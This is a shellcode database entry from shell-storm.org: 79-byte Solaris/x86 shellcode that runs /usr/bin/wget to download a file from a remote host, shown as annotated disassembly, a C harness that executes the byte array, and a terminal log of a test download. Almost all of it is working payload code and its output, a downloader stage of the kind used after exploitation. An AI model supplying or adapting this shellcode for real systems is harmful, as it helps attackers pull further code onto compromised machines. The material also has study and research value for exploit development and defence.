/*
Title:   Solaris/x86 - Remote Download file - 79 bytes
Author:  Jonathan Salwan <submit [!] shell-storm.org>
Web:     http://www.shell-storm.org
Twitter: http://twitter.com/jonathansalwan

!Database of Shellcodes http://www.shell-storm.org/shellcode/

Date:	 2010-05-25
Tested:  SunOS opensolaris 5.11 snv_111b i86pc i386 i86pc Solaris


section .text
    0x8048074:              31 d2              xorl   %edx,%edx
    0x8048076:              52                 pushl  %edx
    0x8048077:              6a 73              pushl  $0x73
    0x8048079:              66 68 72 69        pushw  $0x6972
    0x804807d:              68 73 6f 6c 61     pushl  $0x616c6f73
    0x8048082:              68 70 6c 65 2d     pushl  $0x2d656c70
    0x8048087:              68 65 78 65 6d     pushl  $0x6d657865
    0x804808c:              68 6f 72 67 2f     pushl  $0x2f67726f
    0x8048091:              68 6f 72 6d 2e     pushl  $0x2e6d726f
    0x8048096:              68 6c 2d 73 74     pushl  $0x74732d6c
    0x804809b:              68 73 68 65 6c     pushl  $0x6c656873
    0x80480a0:              89 e1              movl   %esp,%ecx
    0x80480a2:              52                 pushl  %edx
    0x80480a3:              6a 74              pushl  $0x74
    0x80480a5:              68 2f 77 67 65     pushl  $0x6567772f
    0x80480aa:              68 2f 62 69 6e     pushl  $0x6e69622f
    0x80480af:              68 2f 75 73 72     pushl  $0x7273752f
    0x80480b4:              89 e3              movl   %esp,%ebx
    0x80480b6:              52                 pushl  %edx
    0x80480b7:              51                 pushl  %ecx
    0x80480b8:              53                 pushl  %ebx
    0x80480b9:              89 e1              movl   %esp,%ecx
    0x80480bb:              52                 pushl  %edx
    0x80480bc:              51                 pushl  %ecx
    0x80480bd:              53                 pushl  %ebx
    0x80480be:              b0 3b              movb   $0x3b,%al
    0x80480c0:              52                 pushl  %edx
    0x80480c1:              cd 91              int    $0x91


Exemple:
--------

 jonathan@opensolaris:~/shellcode/wget/C$ ls -l
 total 11
 -rwxr-xr-x 1 jonathan staff 8516 2010-05-25 13:33 remotedl-solaris
 -rw-r--r-- 1 jonathan staff  565 2010-05-25 13:33 remotedl-solaris.c
 jonathan@opensolaris:~/shellcode/wget/C$ ./remotedl-solaris
 Length: 79
 --13:37:01--  http://shell-storm.org/exemple-solaris
            => `exemple-solaris'
 Resolving shell-storm.org... 82.243.29.135
 Connecting to shell-storm.org|82.243.29.135|:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 15 [text/plain]

 100%[=============================================>] 15            --.--K/s

 13:37:01 (468.93 KB/s) - `exemple-solaris' saved [15/15]

 jonathan@opensolaris:~/shellcode/wget/C$ cat exemple-solaris
 Hello Solaris.
 jonathan@opensolaris:~/shellcode/wget/C$

*/

#include <stdio.h>


char sc[] = "\x31\xd2\x52\x6a\x73\x66\x68\x72\x69\x68\x73\x6f"
            "\x6c\x61\x68\x70\x6c\x65\x2d\x68\x65\x78\x65\x6d"
            "\x68\x6f\x72\x67\x2f\x68\x6f\x72\x6d\x2e\x68\x6c"
            "\x2d\x73\x74\x68\x73\x68\x65\x6c\x89\xe1\x52\x6a"
            "\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68"
            "\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\x52"
            "\x51\x53\xb0\x3b\x52\xcd\x91";


int main(void)
{
        fprintf(stdout,"Length: %d\n",strlen(sc));
        (*(void(*)()) sc)();

return 0;
}